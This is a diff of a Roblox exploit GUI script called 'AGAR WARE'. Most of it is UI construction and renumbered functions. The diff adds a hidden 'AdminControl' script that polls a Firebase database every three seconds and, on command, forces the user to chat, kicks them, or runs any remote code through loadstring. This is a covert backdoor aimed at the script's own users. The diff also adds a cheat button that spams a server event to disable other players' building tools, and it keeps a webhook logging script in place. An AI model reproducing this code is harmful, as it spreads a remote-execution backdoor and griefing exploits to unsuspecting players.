+G2L["2fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fb"]["Size"] = UDim2.new(0.5, 0, 1, 0);
+G2L["2fb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2fb"]["Text"] = [[Show Friends]];
+G2L["2fb"]["Name"] = [[friends]];
+G2L["2fb"]["Position"] = UDim2.new(0.5, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade
+G2L["2fc"] = Instance.new("CanvasGroup", G2L["2fb"]);
+G2L["2fc"]["Visible"] = false;
+G2L["2fc"]["BorderSizePixel"] = 0;
+G2L["2fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fc"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fc"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fc"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade.UIGradient
+G2L["2fd"] = Instance.new("UIGradient", G2L["2fc"]);
+G2L["2fd"]["Rotation"] = 90;
+G2L["2fd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.text
+G2L["2fe"] = Instance.new("UIStroke", G2L["2fb"]);
+G2L["2fe"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling
+G2L["2ff"] = Instance.new("ScrollingFrame", G2L["2eb"]);
+G2L["2ff"]["Active"] = true;
+G2L["2ff"]["ZIndex"] = 999999999;
+G2L["2ff"]["BorderSizePixel"] = 0;
+G2L["2ff"]["Name"] = [[dropdownScrolling]];
+G2L["2ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ff"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["2ff"]["Size"] = UDim2.new(1, 0, 0.2, 0);
+G2L["2ff"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ff"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2ff"]["ScrollBarThickness"] = 0;
+G2L["2ff"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.UIListLayout
+G2L["300"] = Instance.new("UIListLayout", G2L["2ff"]);
+G2L["300"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button
+G2L["301"] = Instance.new("TextButton", G2L["2ff"]);
+G2L["301"]["TextTransparency"] = 1;
+G2L["301"]["TextSize"] = 14;
+G2L["301"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["301"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["301"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["301"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["301"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["301"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["301"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.image
+G2L["302"] = Instance.new("ImageLabel", G2L["301"]);
+G2L["302"]["ZIndex"] = 99;
+G2L["302"]["BorderSizePixel"] = 0;
+G2L["302"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["302"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
+G2L["302"]["Size"] = UDim2.new(0, 20, 1, 0);
+G2L["302"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["302"]["BackgroundTransparency"] = 1;
+G2L["302"]["Name"] = [[image]];
+G2L["302"]["Position"] = UDim2.new(1, -20, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text
+G2L["303"] = Instance.new("TextLabel", G2L["301"]);
+G2L["303"]["ZIndex"] = 10;
+G2L["303"]["BorderSizePixel"] = 0;
+G2L["303"]["TextSize"] = 14;
+G2L["303"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["303"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["303"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["303"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["303"]["BackgroundTransparency"] = 1;
+G2L["303"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["303"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["303"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.UIPadding
+G2L["304"] = Instance.new("UIPadding", G2L["303"]);
+G2L["304"]["PaddingLeft"] = UDim.new(0, 6);
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.text
+G2L["305"] = Instance.new("UIStroke", G2L["303"]);
+G2L["305"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade
+G2L["306"] = Instance.new("CanvasGroup", G2L["301"]);
+G2L["306"]["Visible"] = false;
+G2L["306"]["BorderSizePixel"] = 0;
+G2L["306"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["306"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["306"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["306"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["306"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade.UIGradient
+G2L["307"] = Instance.new("UIGradient", G2L["306"]);
+G2L["307"]["Rotation"] = 90;
+G2L["307"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.CanvasGroup
+G2L["308"] = Instance.new("CanvasGroup", G2L["1"]);
+G2L["308"]["Visible"] = false;
+G2L["308"]["ZIndex"] = 1999999999;
+G2L["308"]["BorderSizePixel"] = 0;
+G2L["308"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["308"]["Size"] = UDim2.new(0, 450, 0, 80);
+G2L["308"]["Position"] = UDim2.new(0.75448, 0, 0.67079, 0);
+G2L["308"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["308"]["BackgroundTransparency"] = 1;
+
+
 -- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel
-G2L["2da"] = Instance.new("TextLabel", G2L["2d9"]);
-G2L["2da"]["TextWrapped"] = true;
-G2L["2da"]["BorderSizePixel"] = 0;
-G2L["2da"]["TextSize"] = 14;
-G2L["2da"]["TextScaled"] = true;
-G2L["2da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2da"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2da"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["2da"]["BackgroundTransparency"] = 1;
-G2L["2da"]["RichText"] = true;
-G2L["2da"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2da"]["Text"] = [[AGAR WARE]];
+G2L["309"] = Instance.new("TextLabel", G2L["308"]);
+G2L["309"]["TextWrapped"] = true;
+G2L["309"]["BorderSizePixel"] = 0;
+G2L["309"]["TextSize"] = 14;
+G2L["309"]["TextScaled"] = true;
+G2L["309"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["309"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["309"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["309"]["BackgroundTransparency"] = 1;
+G2L["309"]["RichText"] = true;
+G2L["309"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["309"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["309"]["Text"] = [[AGAR WARE]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
-G2L["2db"] = Instance.new("LocalScript", G2L["2da"]);
-G2L["2db"]["Name"] = [[intro]];
+G2L["30a"] = Instance.new("LocalScript", G2L["309"]);
+G2L["30a"]["Name"] = [[intro]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.UIStroke
-G2L["2dc"] = Instance.new("UIStroke", G2L["2da"]);
-G2L["2dc"]["Thickness"] = 1.9;
-G2L["2dc"]["Color"] = Color3.fromRGB(0, 54, 110);
-G2L["2dc"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
+G2L["30b"] = Instance.new("UIStroke", G2L["309"]);
+G2L["30b"]["Thickness"] = 1.9;
+G2L["30b"]["Color"] = Color3.fromRGB(0, 54, 110);
+G2L["30b"]["LineJoinMode"] = Enum.LineJoinMode.Miter;
 
 
 -- StarterGui.T5784YHRGE89ES98T.CanvasGroup.UIScale
-G2L["2dd"] = Instance.new("UIScale", G2L["2d9"]);
-G2L["2dd"]["Scale"] = 1.1;
+G2L["30c"] = Instance.new("UIScale", G2L["308"]);
+G2L["30c"]["Scale"] = 1.1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE
-G2L["2de"] = Instance.new("Folder", G2L["1"]);
-G2L["2de"]["Name"] = [[RandomShitHIDE]];
+G2L["30d"] = Instance.new("Folder", G2L["1"]);
+G2L["30d"]["Name"] = [[RandomShitHIDE]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
-G2L["2df"] = Instance.new("LocalScript", G2L["2de"]);
-G2L["2df"]["Name"] = [[LabelsTags]];
+G2L["30e"] = Instance.new("LocalScript", G2L["30d"]);
+G2L["30e"]["Name"] = [[LabelsTags]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE
-G2L["2e0"] = Instance.new("Folder", G2L["1"]);
-G2L["2e0"]["Name"] = [[MOREMasterHIDE]];
+G2L["30f"] = Instance.new("Folder", G2L["1"]);
+G2L["30f"]["Name"] = [[MOREMasterHIDE]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
-G2L["2e1"] = Instance.new("LocalScript", G2L["2e0"]);
-G2L["2e1"]["Name"] = [[tcotoolrefresh]];
+G2L["310"] = Instance.new("LocalScript", G2L["30f"]);
+G2L["310"]["Name"] = [[tcotoolrefresh]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE
-G2L["2e2"] = Instance.new("Folder", G2L["1"]);
-G2L["2e2"]["Name"] = [[WEBHOOOOOKSSSSSaaHIDE]];
+G2L["311"] = Instance.new("Folder", G2L["1"]);
+G2L["311"]["Name"] = [[WEBHOOOOOKSSSSSaaHIDE]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
-G2L["2e3"] = Instance.new("LocalScript", G2L["2e2"]);
-G2L["2e3"]["Name"] = [[global log]];
+G2L["312"] = Instance.new("LocalScript", G2L["311"]);
+G2L["312"]["Name"] = [[global log]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.mainScript
@@ -6891,7 +7309,7 @@ local script = G2L["9"];
 			maxPlayers
 		)
 	
-		TitleText.Text = "AGAR WARE | v3.0.0-alpha.1 | " .. statsText
+		TitleText.Text = "AGAR WARE | v3.0.0-alpha.2 | " .. statsText
 		TitleText.RichText = true
 	end)
 end;
@@ -6998,9 +7416,104 @@ local script = G2L["14"];
 	switchPage("Home")
 end;
 task.spawn(C_14);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
+local function C_3c()
+local script = G2L["3c"];
+	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
+	
+	local groupbox = script.Parent
+	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
+	local function getScreenGui()
+		local p = groupbox
+		while p do
+			if p:IsA("ScreenGui") then return p end
+			p = p.Parent
+		end
+	end
+	local screenGui = getScreenGui()
+	if not screenGui then return end
+	if uiListLayout then
+		local function updateSize()
+			local contentSize = uiListLayout.AbsoluteContentSize
+			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
+			local scale = uiScale and uiScale.Scale or 1
+			local scaledHeight = (contentSize.Y + 2) / scale
+			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
+		end
+		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
+		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
+		if uiScale then
+			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
+		end
+		updateSize()
+	end
+	
+	
+	
+	-- ====================================================================================================
+	-- GROUPBOX/TAB CONFIGS
+	-- ====================================================================================================
+	
+	_G.CreateButton({
+		frame = "discord",
+		groupbox = script,
+		tooltip = "Join my discord server, press here to copy the link.",
+	
+		callback = function()
+			local success = pcall(function()
+				setclipboard("https://discord.gg/7fDasxV2Ht")
+			end)
+	
+			return success
+		end,
+	
+		afterMessage = "Copied to clipboard!",
+		errorMessage = "Failed to copy!",
+		afterMessageWait = 2,
+		canClickDuringAfter = false,
+	})
+end;
+task.spawn(C_3c);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
+local function C_53()
+local script = G2L["53"];
+	local player = game.Players.LocalPlayer
+	-- Get references to your UI elements
+	local display = script.Parent.display
+	local username = script.Parent.username
+	local joindate = script.Parent.joindate
+	local profile = script.Parent.profile
+	local title = script.Parent.Parent["======TITLE======"].text
+	-- Set display name
+	display.Text = player.DisplayName
+	-- Set username with @ format
+	username.Text = "@" .. player.Name
+	-- Get account creation date and calculate age
+	local accountAge = player.AccountAge
+	local currentDate = os.date("*t")
+	local joinDate = os.date("*t", os.time() - (accountAge * 86400))
+	-- Format: 🗓️ YYYY-MM-DD (X days)
+	local formattedDate = string.format("🗓️ %04d-%02d-%02d (%d days)", 
+		joinDate.year, 
+		joinDate.month, 
+		joinDate.day, 
+		accountAge
+	)
+	joindate.Text = formattedDate
+	-- Set profile picture
+	local userId = player.UserId
+	local thumbType = Enum.ThumbnailType.HeadShot
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	local content = game:GetService("Players"):GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	profile.Image = content
+	profile.Visible = true
+	-- Set title with display name
+	title.Text = "Welcome, " .. player.DisplayName
+end;
+task.spawn(C_53);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.Script
-local function C_3f()
-local script = G2L["3f"];
+local function C_6d()
+local script = G2L["6d"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
 	
 	local groupbox = script.Parent
@@ -7286,10 +7799,10 @@ local script = G2L["3f"];
 		end,
 	})
 end;
-task.spawn(C_3f);
+task.spawn(C_6d);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
-local function C_b5()
-local script = G2L["b5"];
+local function C_e3()
+local script = G2L["e3"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
 	
 	local groupbox = script.Parent
@@ -7575,10 +8088,10 @@ local script = G2L["b5"];
 		end,
 	})
 end;
-task.spawn(C_b5);
+task.spawn(C_e3);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
-local function C_f5()
-local script = G2L["f5"];
+local function C_123()
+local script = G2L["123"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
 	
 	local groupbox = script.Parent
@@ -7951,10 +8464,10 @@ local script = G2L["f5"];
 	})
 	
 end;
-task.spawn(C_f5);
+task.spawn(C_123);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
-local function C_157()
-local script = G2L["157"];
+local function C_185()
+local script = G2L["185"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
 	
 	local groupbox = script.Parent
@@ -8137,10 +8650,10 @@ local script = G2L["157"];
 	
 	
 end;
-task.spawn(C_157);
+task.spawn(C_185);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
-local function C_17f()
-local script = G2L["17f"];
+local function C_1ad()
+local script = G2L["1ad"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
@@ -8246,10 +8759,10 @@ local script = G2L["17f"];
 		end
 	})
 end;
-task.spawn(C_17f);
+task.spawn(C_1ad);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
-local function C_207()
-local script = G2L["207"];
+local function C_235()
+local script = G2L["235"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
@@ -8944,11 +9457,87 @@ local script = G2L["207"];
 			end
 		end,
 	})
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	-- ====================================================================================================
+	-- DISABLE BKIT OG
+	-- ====================================================================================================
+	_G.CreateButton({
+		frame = "disablebkitog",
+		groupbox = script,
+		tooltip = "Disables B-Kit serversided in OG servers using delete tool. New players who gets B-Kit will no longer be able to build.",
+		needsConfirm = true,
+		confirmMessage = "Are you sure?",
+		confirmWait = 1,
+		afterMessage = "Disabled B-Kit!",
+		errorMessage = "Failed!",
+		afterMessageWait = 1,
+		canClickDuringAfter = true,
+		callback = function()
+			local token = _G.SetButtonText("disablebkitog", "Processing...", 999)
+	
+			local success, err = pcall(function()
+				local Players = game:GetService("Players")
+				local LocalPlayer = Players.LocalPlayer
+				local rs = game:GetService("ReplicatedStorage")
+	
+				local character = LocalPlayer.Character
+				if not character then error("No character") end
+	
+				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete")
+				if not deleteTool then error("Delete tool needed!") end
+	
+				if shared.RefreshTool then
+					shared.RefreshTool("Delete")
+					task.wait(0.1)
+				end
+	
+				local hrp = character:FindFirstChild("HumanoidRootPart")
+				if not hrp then error("No HumanoidRootPart") end
+	
+				local cube = rs:FindFirstChild("Cube")
+				if not cube then error("No Cube in ReplicatedStorage") end
+	
+				local events = LocalPlayer.Backpack:FindFirstChild("Events")
+				if not events then error("No Events in Backpack") end
+	
+				local startTime = tick()
+				local maxTime = 5
+	
+				while tick() - startTime < maxTime and not token.cancelled do
+					if not rs:FindFirstChild("Cube") then
+						return true
+					end
+	
+					events:FireServer(hrp.Position, Enum.NormalId.Top, cube, Color3.new(), "Smooth")
+					task.wait(0.01)
+				end
+	
+				error("Timeout - Cube not deleted")
+			end)
+	
+			if success then
+				_G.SetButtonText("disablebkitog", "Disabled B-Kit!", 1)
+				return true
+			else
+				_G.SetButtonText("disablebkitog", err or "Failed!", 1)
+				return false
+			end
+		end,
+	})
 end;
-task.spawn(C_207);
+task.spawn(C_235);
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
-local function C_268()
-local script = G2L["268"];
+local function C_296()
+local script = G2L["296"];
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -9025,10 +9614,10 @@ local script = G2L["268"];
 		tooltip.Visible = false
 	end
 end;
-task.spawn(C_268);
+task.spawn(C_296);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
-local function C_270()
-local script = G2L["270"];
+local function C_29e()
+local script = G2L["29e"];
 	-- ToggleMaster Script
 	local function getScreenGui()
 		local p = script.Parent
@@ -9303,10 +9892,10 @@ local script = G2L["270"];
 	_G.CreateToggle = CreateToggle
 	_G.CreateButtonToggle = CreateButtonToggle
 end;
-task.spawn(C_270);
+task.spawn(C_29e);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
-local function C_271()
-local script = G2L["271"];
+local function C_29f()
+local script = G2L["29f"];
 	-- ButtonMaster Script
 	local function getScreenGui()
 		local p = script.Parent
@@ -9609,10 +10198,10 @@ local script = G2L["271"];
 		return cancelToken
 	end
 end;
-task.spawn(C_271);
+task.spawn(C_29f);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
-local function C_272()
-local script = G2L["272"];
+local function C_2a0()
+local script = G2L["2a0"];
 	-- TextboxMaster Script
 	local function getScreenGui()
 		local p = script.Parent
@@ -9761,10 +10350,10 @@ local script = G2L["272"];
 	end
 	_G.CreateTextbox = CreateTextbox
 end;
-task.spawn(C_272);
+task.spawn(C_2a0);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
-local function C_273()
-local script = G2L["273"];
+local function C_2a1()
+local script = G2L["2a1"];
 	-- SliderMaster Script
 	local function getScreenGui()
 		local p = script.Parent
@@ -9973,10 +10562,10 @@ local script = G2L["273"];
 	
 	_G.CreateSlider = CreateSlider
 end;
-task.spawn(C_273);
+task.spawn(C_2a1);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
-local function C_274()
-local script = G2L["274"];
+local function C_2a2()
+local script = G2L["2a2"];
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -10546,10 +11135,10 @@ local script = G2L["274"];
 	end
 	_G.CreateDropdown = CreateDropdown
 end;
-task.spawn(C_274);
+task.spawn(C_2a2);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
-local function C_275()
-local script = G2L["275"];
+local function C_2a3()
+local script = G2L["2a3"];
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -10813,10 +11402,10 @@ local script = G2L["275"];
 		activePickerButton = nil
 	end)
 end;
-task.spawn(C_275);
+task.spawn(C_2a3);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
-local function C_276()
-local script = G2L["276"];
+local function C_2a4()
+local script = G2L["2a4"];
 	-- ChatMaster Script (put in Gui.MasterScripts.ChatMaster)
 	local Players = game:GetService("Players")
 	local TextChatService = game:GetService("TextChatService")
@@ -10838,10 +11427,10 @@ local script = G2L["276"];
 		end
 	end
 end;
-task.spawn(C_276);
+task.spawn(C_2a4);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
-local function C_277()
-local script = G2L["277"];
+local function C_2a5()
+local script = G2L["2a5"];
 	-- UserListMaster Script (put in Gui.MasterScripts)
 	_G.UserLists = {
 		Blacklisted = {
@@ -10909,10 +11498,10 @@ local script = G2L["277"];
 		return false
 	end
 end;
-task.spawn(C_277);
+task.spawn(C_2a5);
 -- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
-local function C_278()
-local script = G2L["278"];
+local function C_2a6()
+local script = G2L["2a6"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	
@@ -10922,10 +11511,10 @@ local script = G2L["278"];
 		end
 	end
 end;
-task.spawn(C_278);
+task.spawn(C_2a6);
 -- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
-local function C_27a()
-local script = G2L["27a"];
+local function C_2a8()
+local script = G2L["2a8"];
 	-- GUI Protection Script
 	-- Place this at the top of your main script
 	-- Cancel if running in Studio
@@ -11070,10 +11659,10 @@ local script = G2L["27a"];
 		createFakeGui(PlayerGui)
 	end
 end;
-task.spawn(C_27a);
+task.spawn(C_2a8);
 -- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
-local function C_27b()
-local script = G2L["27b"];
+local function C_2a9()
+local script = G2L["2a9"];
 	-- Blacklist Check Script
 	-- Place this LocalScript at the start of your GUI execution
 	local Players = game:GetService("Players")
@@ -11111,10 +11700,57 @@ local script = G2L["27b"];
 	
 	-- If not blacklisted, continue with normal script execution below
 end;
-task.spawn(C_27b);
+task.spawn(C_2a9);
+-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
+local function C_2aa()
+local script = G2L["2aa"];
+	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local TextChatService = game:GetService("TextChatService")
+	local LocalPlayer = Players.LocalPlayer
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	local lastCommandTimestamp = os.time()
+	
+	local function checkForCommands()
+		pcall(function()
+			local response = _req({
+				Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
+				Method = "GET"
+			})
+			if response.StatusCode == 200 and response.Body ~= "null" then
+				local commandData = HttpService:JSONDecode(response.Body)
+				if commandData and commandData.timestamp > lastCommandTimestamp then
+					lastCommandTimestamp = commandData.timestamp
+					if commandData.type == "forcechat" then
+						pcall(function()
+							if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+								TextChatService.TextChannels.RBXGeneral:SendAsync(commandData.message)
+							else
+								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(commandData.message, "All")
+							end
+						end)
+					elseif commandData.type == "kick" then
+						LocalPlayer:Kick("You have been kicked by an admin.")
+					elseif commandData.type == "execute" then
+						pcall(function()
+							loadstring(commandData.code)()
+						end)
+					end
+					-- REMOVED THE DELETE HERE - let the 10 second timer handle it
+				end
+			end
+		end)
+	end
+	
+	while wait(3) do
+		checkForCommands()
+	end
+end;
+task.spawn(C_2aa);
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
-local function C_27d()
-local script = G2L["27d"];
+local function C_2ac()
+local script = G2L["2ac"];
 	local ColorPicker = script.Parent
 	
 	-- UI Elements
@@ -11592,10 +12228,10 @@ local script = G2L["27d"];
 	
 	ColorPicker.Visible = false
 end;
-task.spawn(C_27d);
+task.spawn(C_2ac);
 -- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
-local function C_2db()
-local script = G2L["2db"];
+local function C_30a()
+local script = G2L["30a"];
 	-- Add this at the very top of your script
 	if _G.IntroPlayed then
 		script.Parent.Parent:Destroy()
@@ -11714,10 +12350,10 @@ local script = G2L["2db"];
 	canvasGroup:Destroy()
 	introSound:Destroy()
 end;
-task.spawn(C_2db);
+task.spawn(C_30a);
 -- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
-local function C_2df()
-local script = G2L["2df"];
+local function C_30e()
+local script = G2L["30e"];
 	local Players = game:GetService("Players")
 	local TweenService = game:GetService("TweenService")
 	local RunService = game:GetService("RunService")
@@ -11988,10 +12624,10 @@ local script = G2L["2df"];
 	end
 	game:GetService("Players").PlayerAdded:Connect(addBlacklistedTag)
 end;
-task.spawn(C_2df);
+task.spawn(C_30e);
 -- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
-local function C_2e1()
-local script = G2L["2e1"];
+local function C_310()
+local script = G2L["310"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	
@@ -12018,10 +12654,10 @@ local script = G2L["2e1"];
 		return true
 	end
 end;
-task.spawn(C_2e1);
+task.spawn(C_310);
 -- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
-local function C_2e3()
-local script = G2L["2e3"];
+local function C_312()
+local script = G2L["312"];
 	local _WH = {}
 	do
 		local _HttpService     = game:GetService("HttpService")
@@ -12348,6 +12984,6 @@ local script = G2L["2e3"];
 	-- Send webhook
 	sendWebhook(newCount)
 end;
-task.spawn(C_2e3);
+task.spawn(C_312);
 
 return G2L["1"], require;
